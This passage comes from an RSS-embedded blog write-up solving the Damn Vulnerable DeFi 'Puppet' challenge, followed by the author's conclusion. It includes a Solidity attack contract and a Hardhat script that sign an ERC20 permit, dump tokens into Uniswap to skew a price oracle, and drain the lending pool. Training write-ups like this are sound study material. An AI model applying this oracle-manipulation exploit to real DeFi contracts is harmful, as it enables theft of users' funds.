            v, r, s
        );
        token.transferFrom(owner, address(this), value);

        // swap all our DVTs for ETH
        token.approve(address(uniswapExchange), value);
        uniswapExchange.tokenToEthSwapInput(
            value, // swap all our DVTs
            9.9 * 10**18, // for 9.9 ETH minimum
            block.timestamp &amp;#43; 3600 // deadline (not important)
        );

        // drain lending pool&amp;#39;s DVTs, sending them to owner (player)
        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
            lendingPoolBalance
        );
        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/p&gt;
&lt;p&gt;Relevant Hardhat solve script (full code &lt;a href=&#34;puppet.challenge.js&#34;&gt;here&lt;/a&gt;):&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;200&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;200&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
it(&amp;#39;Execution&amp;#39;, async function () {
    /** CODE YOUR SOLUTION HERE */

    // Attack contract address we obtained previously
    let attackAddress = &amp;#34;0x8464135c8F25Da09e49BC8782676a84730C318bC&amp;#34;
    let spender = attackAddress

    // Hardhat requires a Wallet to obtain the signed
    // transaction data, so make a Wallet for the player
    const accounts = config.networks.hardhat.accounts;
    const index = 1; // wallet of player
    const playerWallet = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path &amp;#43; `/${index}`);

    expect(playerWallet.address).eq(player.address)

    const chainId = (await ethers.provider.getNetwork()).chainId
    const nonce = await token.nonces(playerWallet.address)
    const name = await token.name()

    // Number of tokens to be sent
    const value = 1000n * 10n**18n
    
    // Unix timestamp for deadline
    const deadline = (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp &amp;#43; 3600

    // Define Signature
    const domain = {
        name: name,
        version: &amp;#34;1&amp;#34;,
        verifyingContract: token.address,
        chainId: chainId,
    }

    // Define types
    const types = {
        Permit: [
            {name: &amp;#34;owner&amp;#34;, type: &amp;#34;address&amp;#34;},
            {name: &amp;#34;spender&amp;#34;, type: &amp;#34;address&amp;#34;},
            {name: &amp;#34;value&amp;#34;, type: &amp;#34;uint256&amp;#34;},
            {name: &amp;#34;nonce&amp;#34;, type: &amp;#34;uint256&amp;#34;},
            {name: &amp;#34;deadline&amp;#34;, type: &amp;#34;uint256&amp;#34;},
        ]
    }

    // Define transaction
    const values = {
        owner: playerWallet.address,
        spender: spender,
        value: value,
        nonce: nonce,
        deadline: deadline,
    }

    // Sign data
    const signature = await playerWallet._signTypedData(domain, types, values);

    // Split signature
    const sig = ethers.utils.splitSignature(signature);

    attack = await (await ethers.getContractFactory(&amp;#39;PuppetAttack&amp;#39;, player)).deploy(
        player.address,
        token.address,
        lendingPool.address,
        uniswapExchange.address,
        spender,
        value,
        deadline,
        sig.v, sig.r, sig.s,
        {
            // send most ETH to the attack contract, keeping some for gas
            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
            gasLimit: 1e7
        }
    );
});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;



  &lt;img src=&#34;./img/solved.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;


&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This challenge was interesting, and I learnt a lot about ERC20 permits and oracle manipulation. Despite being the first out of a set of three challenges, its difficulty deceived me with the one transaction requirement.&lt;/p&gt;
&lt;p&gt;Huge thanks to &lt;a href=&#34;https://twitter.com/farazsth98&#34;&gt;&lt;code&gt;Faith&lt;/code&gt;&lt;/a&gt; for helping with the one transaction requirement, and for teaching me a lot throughout my Web3 learning journey.&lt;/p&gt;
&lt;p&gt;As this is my first Web3 post, if I&amp;rsquo;ve made any errors or anything to improve on, please let me know on Discord &lt;code&gt;thesavageteddy&lt;/code&gt; or Twitter/X &lt;a href=&#34;https://twitter.com/teddyctf&#34;&gt;&lt;code&gt;@teddyctf&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Having almost finished DamnVulnerableDefi, I&amp;rsquo;m looking at getting into auditing contracts soon!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
